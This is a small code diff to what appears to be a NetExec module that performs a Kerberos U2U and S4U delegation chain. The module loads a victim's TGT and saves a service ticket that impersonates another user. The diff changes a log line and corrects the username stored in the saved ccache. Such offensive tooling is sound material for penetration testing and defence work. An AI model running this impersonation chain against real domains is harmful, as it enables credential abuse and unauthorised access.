@@ -54,7 +54,7 @@ class NXCModule:
             context.log.fail(f"Cannot load victim TGT {tgt_path}: {e}")
             return
 
-        context.log.highlight(f"Running U2U delegation chain as {connection.username} -> {victim} -> {target_spn} as {impersonate}")
+        context.log.highlight(f"Running U2U delegation chain: {connection.username} (helper) -S4U2self-> {impersonate} -U2U-> {victim} -proxy-> {target_spn}")
         try:
             tgs = kerberos_delegation_u2u_chain(
                 domain=domain,
@@ -79,7 +79,7 @@ class NXCModule:
             try:
                 CCache.fromTGS(
                     tgs["KDC_REP"], tgs["cipher"], tgs["sessionKey"],
-                    spn=target_spn, username=victim, domain=domain.upper(),
+                    spn=target_spn, username=impersonate, domain=domain.upper(),
                 ).saveFile(out)
                 context.log.highlight(f"Saved ccache: {out}")
             except Exception as e:
